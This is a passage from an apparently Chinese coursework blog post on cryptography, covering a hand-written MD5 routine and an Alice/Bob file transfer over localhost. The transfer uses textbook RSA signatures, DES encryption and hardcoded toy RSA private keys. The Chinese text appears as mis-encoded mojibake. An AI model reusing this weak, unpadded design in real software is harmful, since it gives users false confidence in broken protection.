class="hljs-string">&#x27;0&#x27;</span>*length1        <span class="hljs-comment"># å°†å…¶è¡¥å……åˆ° N*512+448  Nå¯ä»¥ä¸º0</span>    text2 = <span class="hljs-built_in">bin</span>(length)[<span class="hljs-number">2</span>:]            <span class="hljs-comment"># å°†å­—ç¬¦é•¿åº¦è½¬æ¢æˆäºŒè¿›åˆ¶æ•°</span>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(text2) &lt; <span class="hljs-number">8</span>:                 <span class="hljs-comment">#  å¡«å……åé¢64ä½,å…ˆå¡«å……å­—ç¬¦ä¸²çš„é•¿åº¦,å†è¡¥0</span>        text2 = <span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(text2)) + text2    length2 = <span class="hljs-number">64</span> - <span class="hljs-built_in">len</span>(text2)    text2 = text2 + <span class="hljs-string">&#x27;0&#x27;</span>*length2        <span class="hljs-comment"># å¡«å……åé¢64ä½,å…ˆå¡«å……å­—ç¬¦ä¸²çš„é•¿åº¦,å†è¡¥0</span>    <span class="hljs-keyword">return</span> text1 + text2<span class="hljs-comment"># å°†æœ€åå¾—åˆ°çš„ABCDé€†åºè¾“å‡º  æœ€åä¸€æ­¥ä½¿ç”¨</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reverse_order</span>(<span class="hljs-params">a</span>):</span>    res = a[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>] + a[<span class="hljs-number">16</span>:<span class="hljs-number">24</span>] + a[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>] + a[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]    <span class="hljs-keyword">return</span> res<span class="hljs-comment"># è¾“å…¥è¦åŠ å¯†çš„æ˜æ–‡</span>password = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥è¦åŠ å¯†çš„ä¿¡æ¯:&quot;</span>)<span class="hljs-comment"># å¡«å……ç®—æ³•</span>x = fill(password)j = <span class="hljs-number">0</span>M = []<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(x),<span class="hljs-number">32</span>):   <span class="hljs-comment"># å°†512ä½åˆ†æˆåå…­ç»„</span>    M.append(x[i:i+<span class="hljs-number">32</span>])    M[j] = M[j][<span class="hljs-number">24</span>:<span class="hljs-number">32</span>] + M[j][<span class="hljs-number">16</span>:<span class="hljs-number">24</span>] + M[j][<span class="hljs-number">8</span>:<span class="hljs-number">16</span>] + M[j][<span class="hljs-number">0</span>:<span class="hljs-number">8</span>]    j+=<span class="hljs-number">1</span><span class="hljs-comment"># md5ç®—æ³•çš„ç¬¬ä¸€æ­¥</span>A,B,C,D= A0,B0,C0,D0  <span class="hljs-comment">#ä¸ºç¬¬äº”æ­¥ ç›¸åŠ åŸå§‹çš„A,B,C,Dåšå¤‡ä»½</span><span class="hljs-comment"># md5ç®—æ³•çš„ç¬¬äºŒæ­¥</span>AA,BB,CC,DD = A,B,C,D<span class="hljs-comment"># md5ç®—æ³•çš„ç¬¬ä¸‰æ­¥</span><span class="hljs-comment"># ç¬¬ä¸€è½®     æ¯è½®A,B,C,Déƒ½å¤„ç†å››æ¬¡ï¼Œå››è½®å°±æ˜¯åå…­æ¬¡ï¼Œä¸€å…±å…­åå››æ¬¡</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):                  <span class="hljs-comment"># få‡½æ•°</span>    A = add(B, shift(add(A, add(add(ffunc(B, C, D), M[<span class="hljs-number">4</span>*i]), Ti[<span class="hljs-number">4</span> * i])), <span class="hljs-number">7</span>))    D = add(A, shift(add(D, add(add(ffunc(A, B, C), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">1</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">1</span>])), <span class="hljs-number">12</span>))    C = add(D, shift(add(C, add(add(ffunc(D, A, B), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">2</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">2</span>])), <span class="hljs-number">17</span>))    B = add(C, shift(add(B, add(add(ffunc(C, D, A), M[<span class="hljs-number">4</span>*i+<span class="hljs-number">3</span>]), Ti[<span class="hljs-number">4</span> * i + <span class="hljs-number">3</span>])), <span class="hljs-number">22</span>))<span class="hljs-comment"># ç¬¬äºŒè½®</span>k = <span class="hljs-number">1</span>j = <span class="hljs-number">16</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):    A = add(B, shift(add(A, add(add(gfunc(B, C, D), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">5</span>))    D = add(A, shift(add(D, add(add(gfunc(A, B, C), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">1</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">9</span>))    C = add(D, shift(add(C, add(add(gfunc(D, A, B), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">2</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">14</span>))    B = add(C, shift(add(B, add(add(gfunc(C, D, A), M[(k+<span class="hljs-number">5</span>*(<span class="hljs-number">4</span>*i+<span class="hljs-number">3</span>))%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">20</span>))<span class="hljs-comment"># ç¬¬ä¸‰è½®</span>k = <span class="hljs-number">5</span>j = <span class="hljs-number">32</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):    A = add(B, shift(add(A, add(add(hfunc(B, C, D), M[(k+i*<span class="hljs-number">4</span>*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">4</span>))    D = add(A, shift(add(D, add(add(hfunc(A, B, C), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">11</span>))    C = add(D, shift(add(C, add(add(hfunc(D, A, B), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">16</span>))    B = add(C, shift(add(B, add(add(hfunc(C, D, A), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>)*<span class="hljs-number">3</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">23</span>))<span class="hljs-comment"># ç¬¬å››è½®</span>k = <span class="hljs-number">0</span>j = <span class="hljs-number">48</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):    A = add(B, shift(add(A, add(add(ifunc(B, C, D), M[(k+(i*<span class="hljs-number">4</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span>])), <span class="hljs-number">6</span>))    D = add(A, shift(add(D, add(add(ifunc(A, B, C), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">1</span>])), <span class="hljs-number">10</span>))    C = add(D, shift(add(C, add(add(ifunc(D, A, B), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">2</span>])), <span class="hljs-number">15</span>))    B = add(C, shift(add(B, add(add(ifunc(C, D, A), M[(k+(i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>)*<span class="hljs-number">7</span>)%<span class="hljs-number">16</span>]), Ti[j + i * <span class="hljs-number">4</span> + <span class="hljs-number">3</span>])), <span class="hljs-number">21</span>))<span class="hljs-comment"># ç¬¬äº”æ­¥  å°†è®¡ç®—å‡ºçš„A,B,C,Dä¸åˆå§‹çš„ç›¸åŠ ï¼Œå¹¶èµ‹å€¼</span>A,B,C,D = add(A, AA),add(B, BB),add(C, CC),add(D, DD)<span class="hljs-comment"># è¾“å‡ºå¾—åˆ°çš„å¯†æ–‡</span>ciphertext = reverse_order(A) + reverse_order(B) + reverse_order(C) + reverse_order(D)cipher = ciphertextciphertext = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(ciphertext, <span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:])   <span class="hljs-comment"># å°†äºŒè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°</span>ciphertext = <span class="hljs-string">&#x27;0&#x27;</span>*(<span class="hljs-number">32</span>-<span class="hljs-built_in">len</span>(ciphertext))+ciphertext <span class="hljs-comment"># ä¸ºäº†é¿å…ç¬¬ä¸€ä¸ªæ•°å­—ä¸ºé›¶æ—¶æ— æ³•æ˜¾ç¤ºå‡ºæ¥</span>print(<span class="hljs-string">&quot;hashå€¼(å°å†™):&quot;</span>,ciphertext)print(<span class="hljs-string">&quot;hashå€¼(å¤§å†™):&quot;</span>,ciphertext.upper())</code></pre><h1 id="å…­ã€ç»¼åˆå®éªŒ"><a href="#å…­ã€ç»¼åˆå®éªŒ" class="headerlink" title="å…­ã€ç»¼åˆå®éªŒ"></a>å…­ã€ç»¼åˆå®éªŒ</h1><h3 id="6-1-å®éªŒå†…å®¹"><a href="#6-1-å®éªŒå†…å®¹" class="headerlink" title="6.1 å®éªŒå†…å®¹"></a>6.1 å®éªŒå†…å®¹</h3><p>ç°åœ¨ï¼ŒAliceæƒ³é€šè¿‡å…¬å…±ä¿¡é“ç»™Bobä¼ è¾“ä¸€ä»½ç§˜å¯†æ–‡ä»¶ï¼ˆæ–‡ä»¶éå¸¸å¤§ï¼‰ã€‚åˆçŸ¥é“ï¼Œå¾ˆå¤šäººå’Œæœºæ„æƒ³å¾—åˆ°è¿™ä»½æ–‡ä»¶ã€‚éœ€è¦è®¾è®¡ä¸€ä¸ªé€šä¿¡æ¨¡å‹ï¼Œæ¥ä¿è¯æ–‡ä»¶çš„æœºå¯†æ€§å’Œå®Œæ•´æ€§ã€‚</p><p>  ç°åœ¨å¾ˆå¤šäººæƒ³è¦å¾—åˆ°è¿™ä»½æ–‡ä»¶ï¼Œé‚£ä¹ˆï¼Œå¯èƒ½ä¼šæœ‰å¾ˆå¤šäººåœ¨å‡å†’Bobçš„èº«ä»½ï¼Œæ¥è¯·æ±‚å¾—åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œéœ€è¦å¯¹Bobèº«ä»½è¿›è¡ŒéªŒè¯ï¼›ä¹Ÿæœ‰å¯èƒ½æ˜¯å¾ˆå¤šäººå¾—ä¸åˆ°æ–‡ä»¶ï¼Œå°±å‡å†’Aliceçš„èº«ä»½ï¼Œæƒ³è¦ç»™Bobå‘é€æ–‡ä»¶ï¼Œå¦‚æœæœ‰äººå‘é€æ¶æ„æ–‡ä»¶ç»™Bobï¼ŒBobå‘ç°ä¸æ˜¯æƒ³è¦çš„æ–‡ä»¶ï¼Œä½†è¿™ä¸ªæ–‡ä»¶ç»™Bobç”µè„‘å®‰è£…äº†åé—¨ï¼Œç­‰ä»–æ¥å—äº†æ­£ç¡®çš„æ–‡ä»¶ï¼Œå°±å­˜åœ¨æ³„æ¼çš„é£é™©ï¼Œæ‰€ä»¥éœ€è¦å¯¹Aliceèº«ä»½è¿›è¡ŒéªŒè¯ã€‚</p><h3 id="6-2-åˆ†æå®éªŒéœ€æ±‚"><a href="#6-2-åˆ†æå®éªŒéœ€æ±‚" class="headerlink" title="6.2 åˆ†æå®éªŒéœ€æ±‚"></a>6.2 åˆ†æå®éªŒéœ€æ±‚</h3><p>ç°åœ¨å¾ˆå¤šäººæƒ³è¦å¾—åˆ°è¿™ä»½æ–‡ä»¶ï¼Œé‚£ä¹ˆï¼Œå¯èƒ½ä¼šæœ‰å¾ˆå¤šäººåœ¨å‡å†’Bobçš„èº«ä»½ï¼Œæ¥è¯·æ±‚å¾—åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œéœ€è¦å¯¹Bobèº«ä»½è¿›è¡ŒéªŒè¯ï¼›ä¹Ÿæœ‰å¯èƒ½æ˜¯å¾ˆå¤šäººå¾—ä¸åˆ°æ–‡ä»¶ï¼Œå°±å‡å†’Aliceçš„èº«ä»½ï¼Œæƒ³è¦ç»™Bobå‘é€æ–‡ä»¶ï¼Œå¦‚æœæœ‰äººå‘é€æ¶æ„æ–‡ä»¶ç»™Bobï¼ŒBobå‘ç°ä¸æ˜¯æƒ³è¦çš„æ–‡ä»¶ï¼Œä½†è¿™ä¸ªæ–‡ä»¶ç»™Bobç”µè„‘å®‰è£…äº†åé—¨ï¼Œç­‰ä»–æ¥å—äº†æ­£ç¡®çš„æ–‡ä»¶ï¼Œå°±å­˜åœ¨æ³„æ¼çš„é£é™©ï¼Œæ‰€ä»¥éœ€è¦å¯¹Aliceèº«ä»½è¿›è¡ŒéªŒè¯ã€‚</p><p><strong>æ ¹æ®åˆ†æï¼Œæ‰€å¾—ç»“æœå¦‚ä¸‹:</strong></p><ol><li><p>ä¼ è¾“çš„æ˜¯ç§˜å¯†æ–‡ä»¶ï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨äººå†’å……bobæ¥æ”¶æ–‡ä»¶ï¼Œæ‰€ä»¥Aliceåœ¨ä¸ä¼ è¾“æ–‡ä»¶ä¹‹å‰éœ€è¦å¯¹bobçš„èº«ä»½è¿›è¡Œè®¤è¯ï¼Œè€Œä¸”bobé˜²æ­¢è¢«æ¬ºéª—ä¹Ÿéœ€è¦å¯¹Aliceçš„èº«ä»½è¿›è¡Œè®¤è¯ï¼Œè¿™é‡Œå¯ä»¥é‡‡ç”¨ç¬¬äºŒç±»ç­¾åç®—æ³•ã€‚</p></li><li><p>åœ¨ç¡®è®¤å½¼æ­¤èº«ä»½åéœ€è¦å°†æ–‡ä»¶é€šè¿‡å…¬å…±ä¿¡é“ä¼ è¾“ï¼Œä½†æ˜¯å¯èƒ½å­˜åœ¨æ”»å‡»äººåŠ«æŒï¼Œæ‰€ä»¥éœ€è¦å¯¹æ–‡ä»¶å†…å®¹åŠ å¯†ï¼Œè€Œæ–‡ä»¶å†…å®¹å¾ˆå¤§ï¼Œè€ƒè™‘åˆ°åŠ å¯†é€Ÿåº¦é—®é¢˜ï¼Œæ‰€ä»¥é‡‡ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•ã€‚</p></li><li><p>é‡‡ç”¨å¯¹ç§°åŠ å¯†ç®—æ³•éœ€è¦å¯†é’¥ï¼Œè€Œè¿™é‡Œä½¿ç”¨éšæœºç”Ÿæˆçš„å¯†é’¥ã€‚å¹¶ä¸”è¿™ä¸ªå¯†é’¥ä¹Ÿéœ€è¦ä¼ ç»™bobç”¨äºè§£å¯†ï¼Œä½†æ˜¯å…¬å…±ä¿¡é“ä¸å®‰å…¨ï¼Œæ‰€ä»¥ä¹Ÿéœ€è¦å¯¹è¯¥å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚è€ƒè™‘åˆ°å¯†é’¥é•¿åº¦ä¸æ˜¯å¾ˆå¤§ï¼Œæ‰€ä»¥å¯ä»¥é‡‡ç”¨å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œè€Œä¸”å…¬é’¥åŠ å¯†ç®—æ³•å¯ä»¥è§£å†³ä¼ è¾“æ­¤æ¬¡åŠ å¯†ä½¿ç”¨çš„å¯†é’¥ï¼Œæé«˜å®‰å…¨æ€§å’Œæ•ˆç‡ã€‚</p></li><li><p>Bobæ”¶åˆ°å¯†æ–‡å’ŒåŠ å¯†åçš„å¯†é’¥ï¼Œä½¿ç”¨è‡ªå·±çš„ç§é’¥è§£å¯†å‡ºå¯¹ç§°åŠ å¯†ç®—æ³•ä½¿ç”¨çš„å¯†é’¥ï¼Œç„¶åä½¿ç”¨å¯†é’¥è§£å¯†å¯†æ–‡åå‘Aliceå‘é€ç¡®è®¤æ¶ˆæ¯ï¼Œç¡®ä¿bobæ”¶åˆ°æ¶ˆæ¯ã€‚</p></li><li><p>ç¡®è®¤æ¶ˆæ¯ä¹Ÿè¦ä½¿ç”¨åˆ°ç¬¬ä¸€æ­¥ä½¿ç”¨çš„ç­¾åç®—æ³•ã€‚</p></li></ol><h3 id="6-3-ç¨‹åºæµç¨‹å›¾"><a href="#6-3-ç¨‹åºæµç¨‹å›¾" class="headerlink" title="6.3 ç¨‹åºæµç¨‹å›¾"></a>6.3 ç¨‹åºæµç¨‹å›¾</h3><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210202142616269.png" alt="image-20210202142616269"></p><h3 id="6-4-å®Œæ•´ä»£ç "><a href="#6-4-å®Œæ•´ä»£ç " class="headerlink" title="6.4 å®Œæ•´ä»£ç "></a>6.4 å®Œæ•´ä»£ç </h3><p>Alice</p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2021/1/3 23:17</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : Alice.py</span><span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> file_decode <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> socketn_bob = <span class="hljs-number">81836285346168841919828227774710209132464519960137459236348092425786962849543</span>n = <span class="hljs-number">44531776921047477359676235110843825307036514195195627878765712056028758572817</span>d = <span class="hljs-number">34159352569920789505556306994405309761109146525598570740717995833480670158209</span>e = <span class="hljs-number">65537</span>name = <span class="hljs-string">&quot;This is alice.&quot;</span>client = socket.socket()client.connect((<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<span class="hljs-number">8888</span>))  <span class="hljs-comment"># æœ¬æœºåœ°å€å’Œç«¯å£</span>data = client.recv(<span class="hljs-number">1024</span>)print(<span class="hljs-built_in">str</span>(data, <span class="hljs-string">&quot;utf-8&quot;</span>),end=<span class="hljs-string">&quot;&quot;</span>)client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)print(<span class="hljs-string">&quot;ç­‰å¾…bobéªŒè¯è‡ªèº«èº«ä»½...&quot;</span>)<span class="hljs-comment"># aliceé€å‡ºè‡ªå·±çš„èº«ä»½ä¿¡æ¯å’Œç­¾åå€¼</span>client.send(<span class="hljs-built_in">bytes</span>(name,<span class="hljs-string">&#x27;utf-8&#x27;</span>))             <span class="hljs-comment"># aliceå‘é€èº«ä»½æ˜æ–‡ä¿¡æ¯</span>client.recv(<span class="hljs-number">1024</span>).decode()hash_name = md5(name)crpto_name = <span class="hljs-built_in">str</span>(RSAEncode(hash_name, d, n)) <span class="hljs-comment"># å‘é€å¯¹hashå€¼åŠ å¯†åçš„å€¼</span>crpto_name = <span class="hljs-built_in">bytes</span>(crpto_name,<span class="hljs-string">&#x27;utf-8&#x27;</span>)client.send(crpto_name)print(client.recv(<span class="hljs-number">1024</span>).decode())             <span class="hljs-comment"># æ¥æ”¶èº«ä»½è®¤è¯çš„ç»“æœ</span><span class="hljs-comment">#æ¥æ”¶bobèº«ä»½hashå¹¶éªŒè¯</span>print(<span class="hljs-string">&quot;éªŒè¯bobèº«ä»½...&quot;</span>,end=<span class="hljs-string">&quot;&quot;</span>)a=<span class="hljs-built_in">input</span>()bob_name = client.recv(<span class="hljs-number">512</span>).decode()          <span class="hljs-comment"># bobå‘é€è¿‡æ¥çš„èº«ä»½æ˜æ–‡ä¿¡æ¯</span>client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)hash_name = client.recv(<span class="hljs-number">512</span>).decode()         <span class="hljs-comment"># bobä½¿ç”¨è‡ªå·±çš„ç§é’¥åŠ å¯†èº«ä»½æ˜æ–‡ä¿¡æ¯hashå€¼åçš„å€¼</span>plain_text = RSADecode(<span class="hljs-built_in">int</span>(hash_name),e,n_bob) <span class="hljs-comment"># ä½¿ç”¨bobçš„å…¬é’¥è§£å¯†ä¸Šä¸€æ­¥çš„å€¼</span>client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)<span class="hljs-keyword">if</span> plain_text == md5(bob_name):          <span class="hljs-comment"># éªŒè¯æ˜¯ä¸æ˜¯bob</span>    print(bob_name)    print(<span class="hljs-string">&quot;éªŒè¯é€šè¿‡!&quot;</span>)<span class="hljs-keyword">else</span>:    exit(<span class="hljs-string">&quot;éªŒè¯é”™è¯¯!&quot;</span>)<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:    a = <span class="hljs-built_in">input</span>()    bin_key = gen_key()         <span class="hljs-comment"># éšæœºç”Ÿæˆ64ä½çš„ DESåŠ å¯†æ˜æ–‡ä½¿ç”¨çš„å¯†é’¥</span>    int_key = <span class="hljs-built_in">int</span>(bin_key,<span class="hljs-number">2</span>)    <span class="hljs-comment"># å°†å…¶è½¬æ¢ä¸ºåè¿›åˆ¶æ•°ï¼Œä¾¿äºåé¢ä½¿ç”¨RSAç®—æ³•åŠ å¯†</span>    print(<span class="hljs-string">&quot;éšæœºäº§ç”Ÿå¯¹ç§°å¯†é’¥:&quot;</span>,int_key)  <span class="hljs-comment"># æ¯æ¬¡ä¼ è¾“éšæœºäº§ç”Ÿä¸€ä¸ªå¯†é’¥æ›´åŠ å®‰å…¨</span>    plain = read_file()    <span class="hljs-comment"># è¯»å–æ–‡ä»¶å†…å®¹</span>    bin_cipher = DES_encode(plain, bin_key) <span class="hljs-comment"># ä½¿ç”¨DESç®—æ³•åŠ å¯†å†…å®¹</span>    a = <span class="hljs-built_in">input</span>()    int_key = fast_mod(int_key,e,n_bob)   <span class="hljs-comment"># åŠ å¯†DESçš„å¯†é’¥ eæ˜¯bobçš„å…¬é’¥</span>    print(<span class="hljs-string">&quot;åŠ å¯†å¯¹ç§°å¯†é’¥&quot;</span>)    print(<span class="hljs-string">&quot;ä¼ è¾“å¯†é’¥...&quot;</span>)               <span class="hljs-comment"># ä¼ è¾“åŠ å¯†åDESå¯†é’¥</span>    client.sendall(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(int_key),<span class="hljs-string">&quot;utf-8&quot;</span>))    client.recv(<span class="hljs-number">512</span>)    length = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(bin_cipher))     <span class="hljs-comment"># ä¼ è¾“å‘é€å†…å®¹çš„é•¿åº¦</span>    length = <span class="hljs-built_in">bytes</span>(length,<span class="hljs-string">&quot;utf-8&quot;</span>)    <span class="hljs-comment"># æ–¹ä¾¿å…¶æ¥æ”¶</span>    client.send(length)    print(<span class="hljs-string">&quot;ä¼ è¾“å¯†æ–‡...&quot;</span>)    client.sendall(<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(bin_cipher),<span class="hljs-string">&quot;utf-8&quot;</span>)) <span class="hljs-comment">#å‘é€å¯†æ–‡</span>    message = client.recv(<span class="hljs-number">512</span>).decode()    client.send(<span class="hljs-string">b&#x27;1&#x27;</span>)    crypt_message = client.recv(<span class="hljs-number">512</span>).decode()    hash_message = RSADecode(<span class="hljs-built_in">int</span>(crypt_message),e,n_bob)    <span class="hljs-keyword">if</span> hash_message == md5(message):        print(message)    print(<span class="hljs-string">&quot;æ–‡ä»¶ä¼ è¾“ç»“æŸï¼&quot;</span>)    <span class="hljs-keyword">break</span>client.close()</code></pre><p>Bob</p><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2021/1/3 23:17</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : bob.py</span><span class="hljs-keyword">import</span> socket<span class="hljs-keyword">import</span> libnum<span class="hljs-keyword">from</span> RSA <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> DES <span class="hljs-keyword">import</span> *<span class="hljs-keyword">from</span> MD5 <span class="hljs-keyword">import</span> *name = <span class="hljs-string">&quot;This is bob.&quot;</span>n = <span class="hljs-number">81836285346168841919828227774710209132464519960137459236348092425786962849543</span>n_alice = <span class="hljs-number">44531776921047477359676235110843825307036514195195627878765712056028758572817</span>d = <span class="hljs-number">39540198292360595989919600111176873707392294831248672388670326288876701993673</span>e = <span class="hljs-number">65537</span><span class="hljs-comment"># e_alice = 2081</span>server = socket.socket() <span class="hljs-comment">#åˆ›å»ºå¯¹è±¡</span>server.bind((<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">8888</span>))<span class="hljs-comment">#ç»‘å®š ipå’Œç«¯å£</span>server.listen()  <span class="hljs-comment">#ç›‘å¬</span><span class="hljs-comment">#ç­‰å¾…è¿æ¥</span>print(<span class="hljs-string">&#x27;Waiting connection...&#x27;</span>)<span class="hljs-comment">#æ¥å—è¯·æ±‚ï¼Œè¿”å›å¥—æ¥å­—å¯¹è±¡å’ŒIP+ç«¯å£å·</span>con,addr = server.accept()con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;Welcome connect!\nå¼€å§‹åŠ å¯†ä¼ è¾“:\n&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>))con.recv(<span class="hljs-number">1024</span>)<span class="hljs-comment"># éªŒè¯aliceèº«ä»½</span>print(<span class="hljs-string">&quot;éªŒè¯aliceèº«ä»½...&quot;</span>)a = <span class="hljs-built_in">input</span>()alice_name = con.recv(<span class="hljs-number">512</span>).decode()  <span class="hljs-comment"># alice çš„æ˜æ–‡ä¿¡æ¯</span>con.send(<span class="hljs-string">b&#x27;1&#x27;</span>)hash_name = con.recv(<span class="hljs-number">512</span>).decode()   <span class="hljs-comment"># alice ç”¨ç§é’¥åŠ å¯†æ˜æ–‡çš„hashå€¼</span>plain_text = RSADecode(<span class="hljs-built_in">int</span>(hash_name),e,n_alice) <span class="hljs-comment"># ç”¨alice çš„å…¬é’¥è§£å¯†å‡ºhashå€¼</span><span class="hljs-keyword">if</span> plain_text == md5(alice_name):   <span class="hljs-comment"># åˆ¤æ–­ä¸Šä¸€æ­¥çš„å€¼ä¸md5å‡½æ•°åŠ å¯†æ˜¯å¦ç›¸åŒ</span>    print(alice_name)               <span class="hljs-comment"># å¦‚æœäºŒè€…ç›¸åŒåˆ™å¯ä»¥ä¿è¯å¯¹æ–¹æ˜¯alice,è¿™é‡Œçš„å®‰å…¨æ€§æ˜¯ç”±å…¬é’¥ç®—æ³•å’Œhashå‡½æ•°ä¿è¯</span>    print(<span class="hljs-string">&quot;éªŒè¯é€šè¿‡ï¼&quot;</span>)               <span class="hljs-comment"># å› ä¸ºåªæœ‰aliceæœ‰è‡ªå·±çš„ç§é’¥ï¼Œhashå‡½æ•°çš„å­˜åœ¨é˜²æ­¢ä¼ªé€ æ˜æ–‡æ”»å‡»</span>    con.send(<span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;æ‚¨é€šè¿‡äº†éªŒè¯!&quot;</span>,<span class="hljs-string">&quot;utf-8&quot;</span>))<span class="hljs-keyword">else</span>:    exit(<span class="hljs-string">&quot;è¿™ä¸æ˜¯alice,éªŒè¯é”™è¯¯ï¼&quot;</span>)<span class="hljs-comment">#é€å‡ºè‡ªå·±çš„èº«ä»½ä¿¡æ¯å’Œç­¾åå€¼</span>print(<span class="hljs-string">&quot;ç­‰å¾…aliceéªŒè¯è‡ªèº«èº«ä»½...&quot;</span>)con.send(<span class="hljs-built_in">bytes</span>(name,<span class="hljs-string">&#x27;utf-8&#x27;</span>))    <span class="hljs-comment"># å‘aliceå‘é€èº«ä»½ä¿¡æ¯çš„æ˜æ–‡</span>con.recv(<span class="hljs-number">1024</span>).decode()hash_name = md5(name)            <span class="hljs-comment"># æ˜æ–‡ä¿¡æ¯çš„hashå€¼</span>crpto_name = <span class="hljs-built_in">str</span>(RSAEncode(hash_name, d, n))  <span class="hljs-comment"># ä½¿ç”¨è‡ªå·±çš„ç§é’¥åŠ å¯†ä¸Šä¸€æ­¥çš„hashå€¼</span>crpto_name = <span class="hljs-built_in">bytes</span>(crpto_name,<span class="hljs-string">&#x27;utf-8&#x27;</span>)        <span class="hljs-comment"># å‘é€ç»™alice</span>con.send(crpto_name)con.recv(<span class="hljs-number">1024</span>)<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:    data = con.recv(<span class="hljs-number">1024</span>)    <span class="hljs-comment"># æ¥æ”¶aliceå‘é€çš„ä½¿ç”¨å…¬é’¥ç®—æ³•åŠ å¯†åçš„DESçš„å¯†é’¥</span>    data = data.decode()    int_key = <span class="hljs-built_in">int</span>(data)    print(<span class="hljs-string">&quot;è¢«åŠ å¯†åçš„å¯†é’¥:&quot;</span>,int_key)    int_key = fast_mod(int_key, d, n)  <span class="hljs-comment"># ä½¿ç”¨ç§é’¥dè§£å¯†å‡ºDESå¯†é’¥</span>    print(<span 